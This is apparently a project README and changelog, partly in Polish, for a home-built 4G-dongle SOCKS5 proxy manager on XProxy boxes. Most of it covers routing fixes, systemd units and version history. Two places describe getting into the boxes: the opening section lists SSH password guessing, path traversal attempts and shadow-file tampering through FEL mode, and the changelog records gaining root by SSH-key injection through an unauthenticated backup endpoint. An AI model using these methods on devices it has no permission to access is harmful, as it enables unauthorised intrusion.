- `GET /v2/system_backup` → **404** (locked behind expired license — exploit used on first box does NOT work on V20.4)
- All config POST endpoints (system_time_zone, update_proxies_settings, etc.) → `{"status":false}` (license check)
- `sshpass` with ~40 common passwords → all failed
- Path traversal via `/v2/vpn_service_upload` → **blocked** (werkzeug `secure_filename` sanitizes filename)

### How to Gain Access to Second Box

**Everything tried so far (2026-03-19):**

| Method | Result |
|--------|--------|
| `/v2/system_backup` exploit | ❌ 404 — locked behind expired license |
| SSH + ~40 common passwords | ❌ All failed |
| Path traversal via `/v2/vpn_service_upload` | ❌ Blocked by werkzeug `secure_filename` |
| HDMI + USB keyboard — login prompt | ✅ Visible — but password unknown, hit lockout after 5 tries |
| GRUB recovery mode (Shift/Esc at boot) | ❌ No GRUB — device uses **U-Boot** (Allwinner H6 / Armbian) |
| U-Boot interrupt from HDMI | ❌ U-Boot outputs to serial only — HDMI shows nothing until kernel boots |

**Why HDMI + keyboard doesn't fully work:**
This device (Tanix TX6 / Allwinner H6 / Armbian) does NOT use GRUB.
It uses U-Boot → extlinux. U-Boot outputs to serial console (UART), not HDMI.
You can see the Linux kernel boot (systemd messages) on HDMI, but you can't interrupt U-Boot from there.

**Remaining options:**

**Option A — USB→UART serial adapter** (~25–40 zł on Shopee/Aliexpress) ⭐ easiest
Connect to UART pins on the PCB, get full U-Boot terminal, add `init=/bin/bash` to boot args, change root password.

**Option B — Allwinner FEL mode via USB**
1. Get USB-C → USB-A cable (Mac to box)
2. `brew install sunxi-tools`
3. Hold reset button inside AV port (toothpick), power on → box enters FEL mode
4. Use `sunxi-fel` to dump eMMC, modify `/etc/shadow`, write back
> Caution: full eMMC dump/write is 29GB over USB — takes 1–2 hours, some brick risk

> Second box remains **on hold** pending serial adapter or FEL mode attempt.
> Add DHCP binding in router before deploying: MAC `02:03:1d:4a:a1:61` → fixed IP (e.g. `192.168.1.108`)

---

## Routing Issues — Complete Guide

Routing jest **najczęstszą przyczyną awarii** tego systemu. Są dwa osobne problemy:

---

### Problem 1 — Dongle DHCP nadpisuje default route ⚠️ NAJWAŻNIEJSZY

**Objawy:**
- Proxy działa lokalnie (`192.168.1.107:1080`) ale nie przez DuckDNS
- `curl https://api4.ipify.org` z XB22 zwraca IP dongla (np. `1.47.x.x`) zamiast IP routera
- DuckDNS aktualizuje się błędnym IP (dongla zamiast routera AIS)
- AdsPower nie może się połączyć mimo że dashboard działa

**Diagnoza:**
```bash
ssh root@192.168.1.107
ip route show default
# ŹLE: widać linie z via 192.168.101.1 lub 192.168.102.1 z metric < 202
# DOBRZE: jedyna linia to: default via 192.168.1.1 dev eth0 ... metric 202

curl https://api4.ipify.org
# Powinno zwrócić IP routera AIS (np. 58.136.146.0)
# Jeśli zwraca 1.47.x.x lub 49.237.x.x — routing jest popsuty
```

**Dlaczego się to dzieje:**
Dongle XH22 podłączone przez USB działają jak interfejsy ethernet z własnym DHCP.
Ten DHCP dodaje default route z niskim metric (101, 102) — niższym niż eth0 (202).
Linux wybiera trasę o najniższym metric → cały ruch XB22 idzie przez dongle zamiast przez router domowy.

**Trwałe naprawienie — cron co minutę (już zainstalowany):**
```bash
# Weryfikacja że cron działa:
crontab -l | grep fix-routes
# Powinno zwrócić: * * * * * /usr/local/bin/fix-routes
```

Instalacja od zera (np. po reinstalacji):
```bash
cp fix-routes /usr/local/bin/fix-routes
chmod +x /usr/local/bin/fix-routes
(crontab -l; echo '* * * * * /usr/local/bin/fix-routes') | crontab -
```

> **Uwaga:** `dhclient-exit-hooks` NIE jest niezawodne — hook nie odpala się przy wszystkich sytuacjach (boot z cached lease, replug, itp.). **Cron co minutę jest jedynym pewnym rozwiązaniem.**

**Ręczna naprawa gdy już się posypało:**
```bash
ssh root@192.168.1.107
# Usuń wszystkie dongle default routes
ip route del default via 192.168.102.1 dev eth1 2>/dev/null; true
ip route del default via 192.168.101.1 dev eth2 2>/dev/null; true
ip route del default via 192.168.102.1 dev eth1 metric 203 2>/dev/null; true
ip route del default via 192.168.101.1 dev eth2 metric 204 2>/dev/null; true
# Weryfikacja — powinna zostać tylko jedna linia z eth0
ip route show default
# Test — musi zwrócić IP routera AIS, nie dongla
curl https://api4.ipify.org
```

**DuckDNS cron — zabezpieczony przez `--interface eth0`:**
```bash
# Cron zawsze wysyła przez eth0 (home network), nigdy przez dongle
crontab -l | grep duckdns
# Powinno zawierać: curl -s --interface eth0 "https://www.duckdns.org/..."
```

---

### Problem 2 — Policy routing nie działa po rebootcie

**Objawy:** SOCKS5 przyjmuje połączenia ale ruch przez dongle timeout-uje

**Root cause:** `networkd-dispatcher` nie zawsze odpala się dla USB ethernet przy starcie

**Fix (zainstalowany jako `xproxy-routing.service`):**
```bash
cat > /etc/systemd/system/xproxy-routing.service << 'EOF'
[Unit]
Description=XProxy dongle policy routing setup
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/etc/networkd-dispatcher/routable.d/50-eth1-policy-routing
Restart=no

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now xproxy-routing.service
```

**Ręczna naprawa:**
```bash
ssh root@192.168.1.107
ip rule add from 192.168.101.100 table 101 2>/dev/null || true
ip rule add from 192.168.102.100 table 102 2>/dev/null || true
ip route replace default via 192.168.101.1 dev eth2 table 101   # adjust ethX
ip route replace default via 192.168.102.1 dev eth1 table 102   # adjust ethX
```

---

### Problem 3 — danted nie startuje (Address already in use)

**Objawy:** `systemctl status danted-dongle0` → `Failed`, port 1080 zajęty

**Dlaczego:** poprzedni proces danted nie został poprawnie zabity

**Fix (zainstalowany — `ExecStartPre fuser -k` w unit file):**
```bash
# Ręczna naprawa:
fuser -k 1080/tcp 2>/dev/null; fuser -k 1081/tcp 2>/dev/null
systemctl restart danted-dongle0 danted-dongle1
```

---

### Checklista diagnostyczna — gdy proxy nie działa

```
1. SSH na XB22:  ssh -i ~/.ssh/id_ed25519 root@192.168.1.107

2. Sprawdź default route:
   ip route show default
   → Musi być TYLKO: default via 192.168.1.1 dev eth0 ... metric 202
   → Jeśli są linie z 192.168.101.1 lub 192.168.102.1 → Problem 1 (usuń je)

3. Sprawdź public IP:
   curl https://api4.ipify.org
   → Musi zwrócić IP routera AIS (np. 58.136.146.0)
   → Jeśli zwraca 1.47.x.x lub 49.237.x.x → Problem 1

4. Sprawdź czy danted działa:
   systemctl is-active danted-dongle0 danted-dongle1
   ss -tlnp | grep -E '1080|1081'
   → Oba muszą być active i nasłuchiwać

5. Test lokalny SOCKS5:
   python3 -c "import requests; print(requests.get('https://api4.ipify.org', timeout=10, proxies={'https':'socks5h://127.0.0.1:1080'}).text)"
   → Musi zwrócić IP True dongla

6. Test zewnętrzny:
   curl --proxy socks5h://havanawin.duckdns.org:1080 https://api4.ipify.org
   → Musi zwrócić IP True dongla
   → Jeśli lokalny (krok 5) działa a zewnętrzny nie → Problem z DuckDNS lub port forwarding
```

---

## Version History

### v2.0.0 — Routing fixes permanent + danted reliability

- **Fixed** dongle DHCP overriding default route: added `dhclient-exit-hooks.d/remove-dongle-defaults` — automatically removes default routes added by dongle DHCP on every renewal. Root cause of most "proxy not working" incidents
- **Fixed** DuckDNS cron: added `--interface eth0` — always sends router's public IP, never dongle IP
- **Fixed** danted systemd: switched from `Type=forking` + PID file to `Type=simple` + `-N 1` (no-fork) + `ExecStartPre fuser -k` — eliminates "Address already in use" restart loops
- **Added** `remove-dongle-defaults` hook file to repo
- **Added** complete routing troubleshooting guide to README with 3 problems, symptoms, causes and checklists

### v1.9.0 — Telegram proxy alerts + persistent alert state

- **Added** Telegram watchdog — monitors SOCKS5 `:1080` (True) and `:1081` (DTAC) every 30s via real HTTP request through each proxy
- **Alert:** after 2 min downtime → `🔴 Dongle-X — proxy nie działa!`
- **Recovery:** when proxy comes back → `✅ Dongle-X — proxy wróciło! IP: x.x.x.x, Czas awarii: X min`
- **Persistent state:** alert state saved to `/var/lib/xproxymgr/alert_state.json` — survives service restarts, recovery messages always correct
- **Fixed Python 3.8 compatibility:** `str | None` → `Optional[str]` (Ubuntu 20.04 ships Python 3.8)
- **Fixed PySocks dependency:** `pip3 install "requests[socks]"` required for SOCKS5 checks — without it all checks fail silently with `Missing dependencies for SOCKS support`
- **Config:** new env vars `TG_TOKEN`, `TG_CHAT_ID`, `PROXY_DOWN_GRACE`, `PROXY_CHECK_INTERVAL`, `SOCKS5_PORTS`

### v1.8.0 — DuckDNS auto-update + second box deep investigation

- **Added** DuckDNS auto-update cron on XB22 (every 5 min) — `havanawin.duckdns.org` self-updates on any network, no manual intervention needed
- **Investigated** second box further: HDMI + USB keyboard connected, login prompt visible, password not found (~40 attempts tried). GRUB recovery impossible — device uses U-Boot (Allwinner H6/Armbian), which does NOT output to HDMI
- **Documented** remaining options for second box: USB→UART serial adapter or Allwinner FEL mode
- **Updated** "Moving to a New Network" guide with DuckDNS auto-update status and clarification that DuckDNS tracks router WAN IP (not dongle IPs)

### v1.7.0 — Routing persistence fix + second box investigation

- **Fixed** policy routing not surviving reboot: added `xproxy-routing.service` systemd unit that runs the routing script reliably at boot (networkd-dispatcher alone was unreliable for USB ethernet interfaces)
- **Investigated** second XProxy XB22 (V20.4) — documented what works and what doesn't
- **Updated** troubleshooting guide with routing recovery procedure

### v1.6.0 — Dashboard redesign: per-dongle cards

- **Removed** single WAN IP card, single signal bar, SOCKS5 Start/Stop buttons
- **Added** dynamic per-dongle cards — only active (connected or has IP) dongles shown
- Each card: IP, signal bar, connection status badge, network type, SOCKS5 port info, last rotate result, Rotate button
- Proxy port auto-calculated per dongle: `1080 + index` (dongle 0 = 1080, dongle 1 = 1081)
- Dashboard JS rebuilds cards on every poll, updating values in place
- `hilink.py`: `get_current_ip()` now uses correct subnet bind IP (`192.168.10x.100`) derived from host, instead of hardcoded `eth1`

### v1.5.0 — Second dongle (DTAC) + two danted instances + IP-based routing

- **Added XH22 dongle 1 (DTAC)** — fully working alongside dongle 0 (True)
- **Two danted instances**: `danted-dongle0.service` (port 1080) and `danted-dongle1.service` (port 1081)
  - Each bound to subnet IP (not interface name): `external: 192.168.101.100` / `external: 192.168.102.100`
  - Uses wrapper script to keep foreground process alive for systemd `Type=simple`
- **IP-based policy routing**: routing script uses `case "$ip"` match instead of `$IFACE` name — survives eth1/eth2 interface swap on reboot/replug
- **Router port forwarding**: added `DTAC-SOCKS5` rule — ext 1081 → 192.168.1.107:1081
- **External access**: `havanawin.duckdns.org:1080` (True) + `havanawin.duckdns.org:1081` (DTAC) both working
- **Config**: `DONGLE_HOSTS` updated to scan 192.168.101.1–105.1 (auto-detect up to 5 dongles)

### v1.4.0 — External access + GET rotate endpoints + routing fix

- **Removed Tailscale** — requires Tailscale on every client device, not suitable for public proxy use
- **DuckDNS + port forwarding** — `havanawin.duckdns.org:1080` (SOCKS5) and `:8080` (dashboard) accessible from any network
  - AIS Fibre F6107A router: port forwarding 1080 and 8080 → 192.168.1.107
  - Fixed router had wrong internal IP (192.168.1.151 → 192.168.1.107) via Chrome CDP
- **Policy routing fix** — SOCKS5 was timing out because outgoing traffic on eth1 was routed via eth0 (asymmetric routing). Fixed with `ip rule + ip route` per-source routing. Persisted via networkd-dispatcher.
- **GET endpoints for AdsPower** — `/api/rotate` and `/api/rotate/<index>` now accept both GET and POST
  - AdsPower rotation URL: `http://havanawin.duckdns.org:8080/api/rotate/0`
- **danted config fixes** — changed `logoutput` to `syslog` (was file causing boot crash), fixed `socksmethod: none` (was `username none`)
- **Deploy fix** — must deploy ALL Python files together; old config.py missing `DONGLE_HOSTS` caused crash

### v1.3.0 — Tailscale external access (removed in v1.4.0)
- Installed Tailscale on XB22 (`tailscale up --reset`)
- Device registered as `xproxy-xb22` on tailnet `martinhavana.github`
- Persistent external IP: `100.97.64.109` (accessible from any network)
- SOCKS5 and dashboard reachable via Tailscale IP from anywhere
- Fixed `external: eth1` in `/etc/danted.conf` (was wrongly `eth0`)

### v1.2.0 — Dashboard fixes + multi-dongle support
- Fixed `proxy_manager.is_running()` to check `danted` instead of `3proxy`
- Fixed `_xml_to_dict()` to flatten nested XML (`<RGW><wan><field>val</field>`)
- Fixed `api/rotate` response (was calling `.get()` on string)
- Dashboard correctly shows SOCKS5 Running, IP, 4G connected
- Added multi-dongle support: auto-detect all XH22 dongles, per-dongle rotate buttons
- Added `/api/rotate/<index>` endpoint

### v1.1.0 — XH22 dongle API reverse-engineered
- Identified as Qualcomm Mongoose 3.0 (NOT Huawei HiLink)
- Reverse-engineered Digest auth quirk (hardcoded uri)
- Discovered endpoints: wan, router, reset, imei, renew
- Tested all rotation methods — only `file=router` reliably changes IP
- IP rotation working: ~5 seconds, new IP every time

### v1.0.0 — Initial root access + stack install
- Identified unauthenticated `/v2/system_backup` and `/v2/system_restore`
- Gained root via SSH key injection through crontab in backup ZIP
- Stopped XProxy, disabled backdoor service
- Installed dante-server (SOCKS5) + Flask dashboard
- SOCKS5 confirmed working on port 1080

---

*Built with Claude Code — session history available at https://github.com/martinhavana/xproxymgr*
